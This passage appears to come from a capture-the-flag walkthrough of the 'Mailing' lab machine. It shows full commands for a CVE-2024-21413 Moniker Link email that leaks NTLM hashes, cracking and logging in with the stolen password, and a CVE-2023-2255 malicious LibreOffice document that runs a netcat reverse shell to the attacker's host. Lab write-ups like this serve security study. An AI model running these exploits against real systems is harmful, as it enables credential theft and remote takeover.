Phase 2

CVE-2024-21413 Moniker Link → NTLM Hash Theft

How Moniker Link steals credentials CVE-2024-21413 affects Microsoft Outlook / Windows Mail. A specially crafted email contains a UNC path (\\attacker\share\file) disguised as a hyperlink. When the victim's mail client renders the email, Windows automatically attempts NTLM authentication to the attacker's SMB server — leaking the user's NTLMv2 hash without any click required. 
# Send malicious email as administrator to maya
$ python3 CVE-2024-21413.py \
  --server mailing.htb --port 587 \
  --username administrator@mailing.htb \
  --password homenetworkingadministrator \
  --sender administrator@mailing.htb \
  --recipient maya@mailing.htb \
  --url '\\10.10.15.65\share\sploit' \
  --subject 'Check this out ASAP!'
# Catch the hash with Responder
$ sudo responder -w -I tun0
[SMB] NTLMv2-SSP Hash: maya::MAILING:f79f12fb8b08ec2a:05ED5BBD...
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
m4y4ngs4ri       (maya)
$ evil-winrm -i 10.129.232.39 -u maya -p 'm4y4ngs4ri'
*Evil-WinRM* PS C:\Users\maya\Desktop> cat user.txt

Phase 3

Privilege Escalation — LibreOffice CVE-2023-2255

*Evil-WinRM* PS> cat "C:\Program Files\LibreOffice\program\version.ini"
MsiProductVersion=7.4.0.1
CVE-2023-2255 — malicious document auto-execution LibreOffice 7.4.x has a vulnerability where .odt files can contain embedded content links that execute commands when opened. A background task simulates an admin opening files from the "Important Documents" share — drop a malicious .odt there and wait. 
# Generate malicious .odt
$ python3 CVE-2023-2255.py \
  --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.15.65 5555' \
  --output exploit.odt
# Upload nc64.exe and exploit.odt via SMB
$ smbclient '//10.129.232.39/important documents' -U maya%m4y4ngs4ri
smb: \> put nc64.exe
smb: \> put exploit.odt

# Copy nc64.exe to persistent location (share gets cleaned periodically)
*Evil-WinRM* PS> copy "C:\Important Documents\nc64.exe" C:\ProgramData\nc64.exe
# Wait for admin to open the .odt (background cron)
$ nc -lnvp 5555
C:\Users\localadmin\Desktop> type root.txt

Appendix

Key Takeaways

Application admin passwords ≠ system passwords.

hMailServer's admin hash gave us mail control, not Windows access. But controlling the mail server enabled the next attack — sending malicious emails as a trusted sender.

CVE-2024-21413 steals NTLM hashes via email — no click needed.

The victim's mail client automatically authenticates to the attacker's SMB server when rendering the Moniker Link. Responder captures the NTLMv2 hash passively.

Windows path traversal uses backslashes.

..\..\..\ not ../../../. Always try both on unknown targets, but Windows-specific applications typically require backslashes.

Unusual software installations signal privesc vectors.

LibreOffice on a Windows server is not standard. Old versions of non-default software are deliberate hints — check CVEs for the exact version.

Shared folders with cron-simulated users are "drop and wait" targets.

Upload the payload, copy dependencies to persistent paths (shares get cleaned), and wait. The simulated user triggers execution within minutes.
